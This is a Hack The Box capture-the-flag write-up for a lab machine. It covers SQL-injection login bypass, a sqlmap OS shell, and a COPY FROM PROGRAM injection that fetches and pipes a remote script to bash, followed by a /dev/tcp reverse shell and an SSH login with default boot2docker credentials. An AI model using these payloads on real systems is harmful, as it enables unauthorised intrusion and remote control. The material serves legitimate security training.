# Box 



![](img/Pasted%20image%2020210818104331.png)

https://www.hackthebox.eu/home/machines/profile/339

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.236 10.10.10.236
```

![](img/Pasted%20image%2020210819032959.png)

There is a domain name `admin.megalogistic.com`, let's add it to `/etc/hosts`. 

In this domain there is a website with a login page.

![](img/Pasted%20image%2020210819033205.png)

Let's try SQL Injection a basic payload. 
```
feff' or 1=1 -- as username
random as password
```

![](img/Pasted%20image%2020210819033449.png)

 ## Exploitation
 
That way we can bypass the login page but there is nothing interesting there.

Let's use `mysql` to get a shell. For this I used burp to save the request in a file.
```sh
sqlmap -r login_page.burp --os-shell --force-ssl
```

![](img/Pasted%20image%2020210819033620.png)

We can execute command so let's get a reverse shell. Before using my payload, I used burp to intercept the request used by `sqlmap` . If you do it directly in `sqlmap` it will timeout and you can loose your reverse shell. To use proxy with sqlmap add to the previous command `--proxy=http://127.0.0.1:8080`. 

Our request look like this : 
```
POST / HTTP/1.1
Content-Length: 319
Host: admin.megalogistic.com
Cookie: PHPSESSID=5499ca99fcf024d40c2859da211af01e
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: https://admin.megalogistic.com
Referer: https://admin.megalogistic.com/
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

username=fezfzf%27%3BDROP%20TABLE%20IF%20EXISTS%20sqlmapoutput%3BCREATE%20TABLE%20sqlmapoutput%28data%20text%29%3BCOPY%20sqlmapoutput%20FROM%20PROGRAM%20%27%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%33%3a%34%34%34%34%2f%72%65%76%65%72%73%65%2e%73%68%20%7c%20%62%61%73%68%27%3B--&password=dezaffe
```

I wrote a file called `reverse.sh` to execute on the remote machine using `curl`.

```sh
bash -c 'exec bash -i &>/dev/tcp/10.10.14.13/1234 <&1'
```

Let's decode the payload of the username parameter to know how the execution is done. 

input : 

```
fezfzf%27%3BDROP%20TABLE%20IF%20EXISTS%20sqlmapoutput%3BCREATE%20TABLE%20sqlmapoutput%28data%20text%29%3BCOPY%20sqlmapoutput%20FROM%20PROGRAM%20%27%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%33%3a%34%34%34%34%2f%72%65%76%65%72%73%65%2e%73%68%20%7c%20%62%61%73%68%27%3B--
```

output : 

```
fezfzf';DROP TABLE IF EXISTS sqlmapoutput;CREATE TABLE sqlmapoutput(data text);COPY sqlmapoutput FROM PROGRAM 'curl http://10.10.14.13:4444/reverse.sh | bash';--
```

Let's press send

![](img/Pasted%20image%2020210819034349.png)

## Post-Exploitation

### User

Well it seems that our user.txt file is in the directory so we already have our user.

![](img/Pasted%20image%2020210819034712.png)

To root. 


### Root

Let's see what we have in the box : 

![](img/Pasted%20image%2020210819034837.png)

There is a `.dockerenv` file so we are in a docker. It was expected since it is a Windows box. For the vulnerability we can check our current name.

![](img/Pasted%20image%2020210819035325.png)

Boot2docker is used to run Docker container. Reading the github we can see that we can log in with ssh.

| User | Password |
| ----- | --------- | 
| docker | tcuser |

Let's check our ip address.

![](img/Pasted%20image%2020210819034948.png)

Our machine is configured with a netmask of /16 and it ends with .2 so let's try with .1 

`ssh docker@172.17.0.1`

![](img/Pasted%20image%2020210819035754.png)

The C folder should be mounted at the root of the machine. 

![](img/Pasted%20image%2020210819035846.png)

From here we can read anything.

![](img/Pasted%20image%2020210819035912.png)

Rooted.